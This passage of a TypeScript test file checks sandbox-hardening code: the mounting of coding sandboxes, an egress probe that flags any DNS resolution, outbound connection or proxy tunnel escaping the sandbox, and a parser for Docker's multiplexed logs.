        expect(patched).toContain('import { mountCodingSandboxes } from "./coding-sandbox.mjs";');
        expect(patched.indexOf('mountCodingSandboxes(app')).toBeGreaterThan(patched.indexOf('app.use("*"'));
        expect(patched.indexOf('mountCodingSandboxes(app')).toBeLessThan(patched.indexOf('serve({'));
        expect(() => hardenSupervisorSandboxes('changed upstream')).toThrow(/contract changed/);
        expect(() => hardenSupervisorSandboxes(upstream + upstream)).toThrow(/contract changed/);
    });
});

describe('the egress probe', () => {
    it('reports every name that resolved and every address that answered', async () => {
        const quiet = await runProbe({
            gateway: '10.213.0.1',
            proxy: '10.213.0.2',
            lookup: async () => {
                throw new Error('ENOTFOUND');
            },
            resolveWith: async () => {
                throw new Error('ECONNREFUSED');
            },
            opens: async () => false,
            tunnel: async () => false,
        });
        expect(quiet).toEqual({
            probe: 'socio-egress-probe',
            v: 1,
            resolved: [],
            reached: [],
            tunnel: false,
        });
        expect(probeVerdict(0, `noise\n${JSON.stringify(quiet)}\n`)).toEqual({
            ok: true,
            failures: [],
        });
        const leaky = await runProbe({
            gateway: '10.213.0.1',
            proxy: '10.213.0.2',
            lookup: async (name: string) => (name === 'github.com' ? [{ address: '140.82.112.3' }] : []),
            resolveWith: async (server: string) => (server === '8.8.8.8' ? ['93.184.215.14'] : []),
            opens: async (host: string, port: number) =>
                host === '2606:4700:4700::1111' || (host === '10.213.0.1' && port === 4300),
            tunnel: async () => true,
        });
        expect(leaky.resolved).toEqual(['example.com via 8.8.8.8', 'github.com']);
        expect(leaky.reached).toEqual(['2606:4700:4700::1111:443', 'gateway:4300']);
        expect(probeVerdict(0, JSON.stringify(leaky)).failures).toEqual([
            'resolved example.com via 8.8.8.8',
            'resolved github.com',
            'reached 2606:4700:4700::1111:443',
            'reached gateway:4300',
            'the proxy opened a tunnel',
        ]);
        expect(probeVerdict(0, '{"probe":"socio-egress-probe","resolved":[]}').ok).toBe(false);
    });

    it('reads Docker’s multiplexed logs (stdout only)', () => {
        const frame = (type: number, text: string) => {
            const body = Buffer.from(text);
            const header = Buffer.alloc(8);
            header[0] = type;
            header.writeUInt32BE(body.length, 4);
            return Buffer.concat([header, body]);
        };
        expect(demuxLogs(Buffer.concat([frame(1, 'a'), frame(2, 'err'), frame(1, 'b')]))).toBe('ab');
    });
});

// Keeps the type import used where only values are referenced.
export type { SandboxConfig };
